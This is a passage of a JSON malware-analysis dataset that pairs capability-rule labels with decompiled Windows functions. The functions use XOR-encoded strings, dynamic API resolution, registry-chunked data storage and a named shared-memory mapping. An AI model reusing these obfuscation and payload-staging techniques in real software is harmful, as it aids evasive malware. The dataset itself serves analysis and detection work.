        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004099f4(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uchar *puVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t *in_EDX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    code *pcVar11;\n    int32_t *piVar12;\n    int32_t iVar13;\n    uchar *puVar14;\n    uint var_a0h;\n    uint var_98h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t *var_68h;\n    int32_t var_64h;\n    uchar *var_60h;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uchar uStack60;\n    uint var_37h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_14h;\n    uchar var_13h;\n    ushort var_12h;\n    uchar var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_54h = 0;\n    var_50h = 0;\n    var_48h = 0;\n    var_40h = 0x201d3d2b;\n    var_ch = 7;\n    var_3ch = 0x291c6b07;\n    uStack60 = 0x25;\n    var_37h._0_1_ = 0x79;\n    var_8h = 0x4c794945;\n    var_4h = var_4h & 0xff000000 | 0x78456b;\n    var_68h = in_EDX;\n    fcn.00401000(10);\n    iVar8 = var_5ch;\n    iVar13 = 0;\n    do {\n        puVar1 = iVar13 + var_5ch;\n        iVar9 = iVar13 % var_ch;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_40h - var_5ch];\n    } while (iVar13 < 10);\n    var_30h = 0x38251f09;\n    var_2ch = 0x184d423d;\n    var_28h = 0x2e000d26;\n    var_24h = 0x261f1a03;\n    var_20h = 0x23130521;\n    var_1ch = 0x19171b23;\n    var_18h._0_1_ = 0x21;\n    var_18h._1_1_ = 7;\n    var_18h._2_2_ = 0x3211;\n    var_14h = 0x39;\n    var_12h = 0x7d4f;\n    var_10h = 0x53;\n    var_8h = 0x57726853;\n    var_4h = 0x4979744a;\n    var_13h = var_18h._1_1_;\n    fcn.00401000(0x21);\n    iVar13 = var_64h;\n    uVar10 = 0;\n    do {\n        puVar1 = uVar10 + var_64h;\n        uVar6 = uVar10 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar10 = uVar10 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_30h - var_64h];\n        pcVar11 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    } while (uVar10 < 0x21);\n    if ((*0x41c214 & 1) == 0) {\n        *0x41c214 = *0x41c214 | 1;\n        *0x41c218 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar8);\n    }\n    if ((*0x41c214 & 2) == 0) {\n        *0x41c214 = *0x41c214 | 2;\n        *0x41c21c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41c218, iVar13);\n    }\n    if (*0x41c218 == 0) {\n        *0x41c218 = (*pcVar11)(iVar8);\n    }\n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41c21c == NULL) {\n        var_30h = 0x38251f09;\n        var_2ch = 0x184d423d;\n        var_28h = 0x2e000d26;\n        var_24h = 0x261f1a03;\n        var_20h = 0x23130521;\n        var_1ch = 0x19171b23;\n        var_18h._0_1_ = 0x21;\n        var_18h._1_1_ = 7;\n        var_18h._2_2_ = 0x3211;\n        var_14h = 0x39;\n        var_12h = 0x7d4f;\n        var_10h = 0x53;\n        var_8h = 0x57726853;\n        var_4h = 0x4979744a;\n        var_13h = var_18h._1_1_;\n        fcn.00401000(0x21);\n        iVar8 = var_ch;\n        uVar10 = 0;\n        do {\n            puVar1 = uVar10 + var_ch;\n            uVar6 = uVar10 & 0x80000007;\n            if (uVar6 < 0) {\n                uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n            }\n            uVar10 = uVar10 + 1;\n            *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_30h - var_ch];\n        } while (uVar10 < 0x21);\n        *0x41c21c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41c218, var_ch);\n        uVar7 = (*pcVar11)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n        iVar8 = var_5ch;\n        iVar13 = var_64h;\n    }\n    fcn.00409365();\n    if ((*0x41c21c != NULL) && (iVar9 = (**0x41c21c)(var_44h, 0, &var_a0h, 0x30, &var_4ch),  -1 < iVar9)) {\n        uVar7 = (*pcVar11)(0, 0x200);\n        var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        if (var_60h != NULL) {\n            uVar7 = (*pcVar11)(0, 0x100);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n            if (((iVar9 != 0) && (var_4ch = fcn.0040985c(iVar9, 0x28),  var_4ch != 0)) &&\n               (var_4ch = fcn.0040985c(iVar9 + 0x28, 0x40),  var_4ch != 0)) {\n                var_3ch = *(iVar9 + 0x3c);\n                var_ch = *(iVar9 + 0x18) + 0x10;\n                var_4h = *(iVar9 + 0x1c) + (0xffffffef < *(iVar9 + 0x18));\n                piVar12 = var_68h + 2;\n                var_40h = *(iVar9 + 0x38);\n                var_48h = 4;\n                if ((var_40h != var_ch) || (*(iVar9 + 0x3c) != var_4h)) {\n                    do {\n                        var_4ch = fcn.0040985c(iVar9 + 0x68, 0x98);\n                        puVar4 = var_60h;\n                        iVar8 = var_5ch;\n                        iVar13 = var_64h;\n                        if (var_4ch == 0) break;\n                        var_70h = *(iVar9 + 0x68);\n                        var_6ch = *(iVar9 + 0x6c);\n                        var_48h = var_48h + 0x120;\n                        var_40h = var_70h;\n                        var_3ch = var_6ch;\n                        if (var_48h <= arg_8h) {\n                            uVar2 = *(iVar9 + 0xb0);\n                            *(piVar12 + 6) = var_50h;\n                            piVar12[5] = *(iVar9 + 0xd0);\n                            *(piVar12 + 7) = *(iVar9 + 0xd4);\n                            piVar12[4] = *(iVar9 + 0xa8);\n                            piVar12[2] = *(iVar9 + 0x98);\n                            var_58h = uVar2 >> 1;\n                            piVar12[3] = *(iVar9 + 0x9c);\n                            puVar14 = var_60h;\n                            for (iVar8 = 0x200; iVar8 != 0; iVar8 = iVar8 + -1) {\n                                *puVar14 = 0;\n                                puVar14 = puVar14 + 1;\n                            }\n                            if ((var_58h < 0x100) && (var_4ch = fcn.0040985c(var_60h, *(iVar9 + 0xb0)),  var_4ch != 0))\n                            {\n                                uVar10 = 0;\n                                if (var_58h != 0) {\n                                    do {\n                                        *(uVar10 + 0x20 + piVar12) = puVar4[uVar10 * 2];\n                                        uVar10 = uVar10 + 1;\n                                    } while (uVar10 < var_58h);\n                                }\n                                *(var_58h + 0x20 + piVar12) = 0;\n                                iVar5 = (*_sym.imp.ntdll.dll_strrchr)(piVar12 + 8, 0x5c);\n                                *(piVar12 + 0x1e) = iVar5 + (-0x1f - piVar12);\n                            }\n                            piVar12 = piVar12 + 0x48;\n                            var_50h = var_50h + 1;\n                        }\n                    } while ((var_70h != var_ch) || (iVar8 = var_5ch,  iVar13 = var_64h,  var_6ch != var_4h));\n                }\n                if (var_68h != NULL) {\n                    *var_68h = var_50h;\n                }\n            }\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_60h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar9 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_48h;\n    }\n    if ((var_48h <= arg_8h) && (var_48h != 0)) {\n        var_54h = 1;\n    }\n    uVar7 = (*pcVar11)(0, iVar13);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar11)(0, iVar8);\n    (*pcVar3)(uVar7);\n    return var_54h;\n}\n",
        "token_count": 2917
    },
    "0040a20b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a20b(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    uint32_t *puVar7;\n    uint var_10h;\n    uint lpString2;\n    uint32_t lpString1;\n    uint32_t var_4h;\n    \n    fcn.00409365();\n    fcn.004099f4(0, &var_4h);\n    lpString1 = var_4h;\n    puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar2 != NULL) {\n        do {\n            iVar3 = fcn.004099f4(lpString1, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar3 != 0) || (var_4h <= lpString1)) break;\n            lpString1 = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, 0, 0x8000);\n            puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar2 != NULL);\n        uVar6 = 2;\n        if ((puVar2 != NULL) && (uVar1 <= lpString1)) {\n            var_4h = 0;\n            puVar7 = puVar2 + 2;\n            if (*puVar2 != 0) {\n                do {\n                    iVar3 = *(puVar7 + 0x1e) + 0x20 + puVar7;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar3, in_EDX),  iVar4 == 0)) {\ncode_r0x0040a318:\n                        uVar6 = 0;\n                        *arg_8h = puVar7[2];\n                        arg_8h[1] = puVar7[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar7[4];\n                        }\n                        break;\n                    }\n                    puVar5 = (*_sym.imp.ntdll.dll_strchr)(iVar3, 0x2e);\n                    if (puVar5 != NULL) {\n                        *puVar5 = 0;\n                        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar3, in_EDX);\n                        if (iVar3 == 0) goto code_r0x0040a318;\n                    }\n                    puVar7 = puVar7 + 0x48;\n                    var_4h = var_4h + 1;\n                } while (var_4h < *puVar2);\n            }\n            goto code_r0x0040a339;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040a339:\n    if (puVar2 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 745
    },
    "0040a933": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040a933(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t unaff_EBX;\n    uint *puVar10;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t *var_58h;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar9 = unaff_EBX & 0xffffff00;\n    var_58h = param_1;\n    var_44h = param_2;\n    var_3ch = uVar9;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    uVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if ((((uVar4 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_54h = uVar4;\n        fcn.0040a7cd();\n        hKey = fcn.0040a778(0x20006);\n        if (hKey != 0) {\n            var_40h = *param_1;\n            var_38h = 0x4e226833;\n            var_34h = 0x51555500;\n            var_30h = 0x6e374b1a;\n            var_2ch = 0x683c341c;\n            var_28h = 0x55094e2a;\n            var_24h = 0x4b4d5151;\n            var_4ch = (((var_40h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar10 = &ARG_0;\n            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_20h = 0x34556e2a;\n            puVar10 = &lpValueName;\n            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_8h = 0x4e4b6851;\n            var_4h = var_4h & 0xff000000 | 0x34556e;\n            fcn.00401000(0x38);\n            iVar6 = 0;\n            var_ch = &var_38h - var_50h;\n            do {\n                var_1ch = 7;\n                puVar1 = iVar6 + var_50h;\n                iVar8 = iVar6 % 7;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_38h - var_50h];\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_50h, var_44h);\n            iVar6 = hKey;\n            var_ch = 0;\n            var_18h = 0x553c6d5c;\n            var_14h = 0x584e5615;\n            var_10h = 0x554f6d1d;\n            var_8h = 0x554f6d79;\n            var_4h = 0x586b564a;\n            do {\n                fcn.00401000(0x18);\n                iVar8 = var_44h;\n                uVar9 = 0;\n                do {\n                    puVar1 = uVar9 + var_44h;\n                    uVar4 = uVar9 & 0x80000007;\n                    if (uVar4 < 0) {\n                        uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar9 = uVar9 + 1;\n                    *puVar1 = *(&var_8h + uVar4) ^ puVar1[&var_18h - var_44h];\n                } while (uVar9 < 0xc);\n                puVar10 = &lpValueName;\n                for (iVar7 = 0x40; iVar2 = var_ch,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar8, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(iVar6, &lpValueName);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                var_ch = iVar2 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            uVar9 = var_3ch;\n            if (0 < var_4ch) {\n                var_18h = 0x553c6d5c;\n                var_14h = 0x584e5615;\n                var_10h = 0x554f6d1d;\n                var_8h = 0x554f6d79;\n                var_4h = 0x586b564a;\n                var_ch = 0;\n                do {\n                    iVar6 = var_ch;\n                    fcn.00401000(0x18);\n                    uVar4 = var_3ch;\n                    uVar9 = 0;\n                    do {\n                        puVar1 = uVar9 + var_3ch;\n                        uVar5 = uVar9 & 0x80000007;\n                        if (uVar5 < 0) {\n                            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar9 = uVar9 + 1;\n                        *puVar1 = *(&var_8h + uVar5) ^ puVar1[&var_18h - var_3ch];\n                    } while (uVar9 < 0xc);\n                    puVar10 = &lpValueName;\n                    for (iVar8 = 0x40; iVar7 = var_1ch,  iVar8 != 0; iVar8 = iVar8 + -1) {\n                        *puVar10 = 0;\n                        puVar10 = puVar10 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, uVar4, &ARG_0, var_1ch);\n                    iVar8 = 0x7d000;\n                    if (var_40h < 0x7d000) {\n                        iVar8 = var_40h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, &lpValueName, 0, 3, var_58h[1] + iVar6, iVar8)\n                    ;\n                    uVar9 = 1 - (iVar6 != 0);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    var_1ch = iVar7 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_40h = var_40h + -0x7d000;\n                } while (var_1ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_50h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar4 = var_54h;\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4 & 0xffffff00 | uVar9 & 0xff;\n}\n",
        "token_count": 2085
    },
    "0040ac4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ac4d(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t hKey;\n    uchar *var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uchar *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *lpType;\n    int32_t lpcbData;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    lpType = param_1;\n    var_14h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_54h = iVar3;\n        fcn.0040a7cd();\n        hKey = fcn.0040a778(0x20019);\n        if (hKey != 0) {\n            var_5ch = 0;\n            var_4ch = 0x4e226833;\n            puVar10 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_48h = 0x51555500;\n            puVar10 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_44h = 0x6e374b1a;\n            var_40h = 0x683c341c;\n            var_3ch = 0x55094e2a;\n            var_38h = 0x4b4d5151;\n            var_34h = 0x34556e2a;\n            var_10h = 0x4e4b6851;\n            var_ch._0_2_ = 0x556e;\n            var_ch._2_1_ = 0x34;\n            fcn.00401000(0x38);\n            iVar3 = 0;\n            do {\n                var_8h = 7;\n                puVar1 = iVar3 + var_58h;\n                iVar8 = iVar3 % 7;\n                iVar3 = iVar3 + 1;\n                *puVar1 = *(&var_10h + iVar8) ^ puVar1[&var_4ch - var_58h];\n            } while (iVar3 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_58h, var_14h);\n            param_1 = lpType;\n            var_30h = 0x553c6d5c;\n            var_2ch = 0x584e5615;\n            var_28h = 0x554f6d1d;\n            var_24h = 0x554f6d79;\n            var_20h = 0x586b564a;\n            do {\n                puVar10 = &var_10h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                puVar10 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                fcn.00401000(0x18);\n                iVar3 = var_5ch;\n                uVar9 = 0;\n                do {\n                    puVar1 = uVar9 + var_8h;\n                    uVar7 = uVar9 & 0x80000007;\n                    if (uVar7 < 0) {\n                        uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar9 = uVar9 + 1;\n                    *puVar1 = *(&var_24h + uVar7) ^ puVar1[&var_30h - var_8h];\n                } while (uVar9 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, var_8h, &ARG_0, var_5ch);\n                var_5ch = iVar3 + 1;\n                var_1h._0_1_ = '\\0';\n                iVar3 = 0;\n                var_50h = NULL;\n                var_14h = 0;\n                iVar8 = fcn.0040a778(0x20019);\n                if (iVar8 != 0) {\n                    lpType = 0x3;\n                    lpcbData = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(iVar8, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar4 == 0) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpcbData);\n                        var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (var_60h == NULL) {\n                            puVar6 = NULL;\n                            iVar4 = iVar3;\n                        }\n                        else {\n                            iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (iVar8, &lpValueName, 0, &lpType, var_60h, &lpcbData);\n                            puVar6 = var_60h;\n                            iVar4 = lpcbData;\n                            if (iVar5 != 0) goto code_r0x0040ae73;\n                        }\n                        var_1h._0_1_ = '\\x01';\n                        iVar3 = iVar4;\n                        var_50h = puVar6;\n                        var_14h = iVar4;\n                    }\ncode_r0x0040ae73:\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar8);\n                    if (((var_1h != '\\0') && (var_50h != NULL)) && (iVar3 != 0)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1], *param_1 + iVar3);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_50h;\n                        puVar11 = iVar3 + *param_1;\n                        for (iVar8 = var_14h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                            *puVar11 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar11 = puVar11 + 1;\n                        }\n                        *param_1 = *param_1 + var_14h;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_50h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_58h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar3 = var_54h;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2168
    },
    "0040af3f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040af3f(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = *0x41bd3c;\n    if (*0x41bdec != 0) {\n        return 1;\n    }\n    var_40h = 0x41223340;\n    var_3ch = 0x3770570a;\n    var_38h = 0x702d515f;\n    var_34h = 0x33563419;\n    var_30h = 0x5715413c;\n    var_2ch = 0x515b3767;\n    var_28h = 0x34257020;\n    var_24h = 0x41353352;\n    var_20h = 0x37515723;\n    var_1ch = 0x70355150;\n    var_18h = 0x3358343e;\n    var_14h = 0x5770413f;\n    var_10h = 0x41513337;\n    var_ch._0_2_ = 0x5770;\n    var_ch._2_1_ = 0x34;\n    fcn.00401000(0x60);\n    iVar2 = var_4h;\n    iVar6 = 0;\n    iVar3 = &var_40h - var_4h;\n    do {\n        var_4h = 7;\n        puVar1 = iVar6 + iVar2;\n        iVar5 = iVar6 % 7;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_10h + iVar5) ^ puVar1[iVar3];\n    } while (iVar6 < 0x30);\n    *0x41bdec = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar2);\n    uVar4 = var_8h;\n    if (*0x41bdec != 0) {\n        if ((*0x41bde8 != 0) ||\n           (*0x41bde8 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41bdec, 0xf001f, 0, 0, 0x208),  *0x41bde8 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41bde8, uVar4);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41bdec);\n        *0x41bdec = 0;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return 0;\n}\n",
        "token_count": 821
    },
    "0040b11b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b11b(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(0, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0040b3b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
